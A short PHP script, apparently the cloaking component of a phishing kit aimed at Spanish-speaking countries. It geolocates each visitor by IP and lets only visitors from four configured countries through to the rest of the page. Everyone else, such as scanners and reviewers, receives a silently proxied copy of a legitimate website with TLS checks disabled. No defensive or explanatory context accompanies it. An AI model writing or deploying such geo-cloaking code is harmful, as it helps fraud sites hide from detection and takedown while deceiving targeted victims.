<?php
ini_set('memory_limit', '512M');
include("configuracion.php");
include("geoiploc.php");

$ip = $_SERVER['REMOTE_ADDR'];
$IPPais = getCountryFromIP($ip);

$html = "";

if($IPPais === $Pais_1 or $IPPais === $Pais_2 or $IPPais === $Pais_3 or $IPPais === $Pais_4){
// $file = fopen("../logs/visita_cl.txt", "a");
// fwrite($file, $IPPais."-".$ip." - ".$_SERVER['HTTP_USER_AGENT']." - ".$_SERVER['HTTP_REFERER']. PHP_EOL);
// fclose($file);
}else{
$curl = curl_init(); 
		curl_setopt($curl, CURLOPT_URL, $Urlweb);
		curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 0);
		curl_setopt($curl, CURLOPT_AUTOREFERER, TRUE);
		curl_setopt($curl, CURLOPT_FRESH_CONNECT, TRUE); 
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($curl, CURLOPT_MAXREDIRS, 10);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($curl, CURLOPT_HEADER, FALSE);
		curl_setopt($curl, CURLOPT_TIMEOUT, 40);
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, "");
		curl_setopt($curl, CURLOPT_FAILONERROR, TRUE);
		$html = curl_exec($curl);
		curl_close($curl);
		$html = str_replace('href="/', 'href="'.$Urlweb, $html);
		$html = str_replace('src="/', 'src="'.$Urlweb, $html);
		echo $html;
		exit;
}

?>